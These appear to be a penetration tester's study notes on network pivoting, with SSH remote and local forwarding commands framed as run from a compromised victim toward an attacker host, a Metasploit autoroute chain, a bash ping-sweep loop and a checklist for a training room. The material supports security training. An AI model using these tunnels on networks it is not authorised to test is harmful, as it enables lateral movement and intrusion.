[Labs](https://attackdefense.com/listing?labtype=linux-security-pivoting&subtype=linux-security-pivoting-basics)
[Cheatsheet](https://web.archive.org/web/20181108223619/https://bitrot.sh/cheatsheet/14-12-2017-pivoting/)
[Blog](https://medium.com/@6c2e6e2e/network-pivoting-like-a-pro-2fa04a569d8c)
[Red teamers guide to pivoting](https://web.archive.org/web/20181110130047/https://artkond.com/2017/03/23/pivoting-guide/)
[Bitrot](https://web.archive.org/web/20180405115503/https://bitrot.sh/)

[Lab](https://tryhackme.com/room/wreath)
[Lab](https://tryhackme.com/room/borderlands)
# SSH port forwarding

Port tunneling or forwarding is a networking technique that allows traffic between ocal and remote machine.
We use port tunneling when we either can’t reach a destination because it is protected behind a firewall or only accessible internally.

## Remote Forwarding
Exposing the internal services and interact with them from attacker machine.
so basically :

|Victim side|Attacker side|
|--|--|
|127.0.0.1:3306|192.168.0.106:8080|
|127.0.0.1:5900|192.168.0.106:5555|

With remote port forwarding attacker is the one listening locally for traffic from the compromised server.

`ssh -R RemortPort:localhost:localport attacker@192.168.0.106`

Commands will be ==executed on victim machine==:
```
ssh -R 8080:127.0.0.1:3306 attacker@192.168.0.106
ssh -R 5555:127.0.0.1:5900 attacker@192.168.0.106
```

## Local Forwarding
Making remote service available on local machine.
```
ssh -L local_port:remort_ip:remort_port victim@ip

ssh -L 5050:127.0.0.1:21 admin@10.10.10.90
```
means on attacker machine local port 5050 will be routed to port 21 of victim machine 10.10.10.90.


### If there is no way then use msf
****
web_delivery > autoroute > ping sweep > Will get all the internal services.
****


# Manual
To find out the avaiable hosts in linux we will do ping speep
`for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done`
by this simple script we will be able to find up hosts.

***So 3 ways:***
1. ssh from the machine to attacker (remote)
2. ssh from attacker to machine (local)
3. autoroute for internal ip running services.

![](https://i.imgur.com/aTxpNSI.png)

# Wreath
**Contents**
- [ ] Code Analysis (Python and PHP)
- [ ] Locating and modifying public exploits  
    
- [ ]  Simple webapp enumeration and exploitation  
    
- [ ] Git Repository Analysis
- [ ] Simple Windows Post-Exploitation techniques
- [ ] CLI Firewall Administration (CentOS and Windows)
- [ ] Cross-Compilation techniques
- [ ] Coding wrapper programs
- [ ] Simple exfiltration techniques  
    
- [ ] Formatting a pentest report


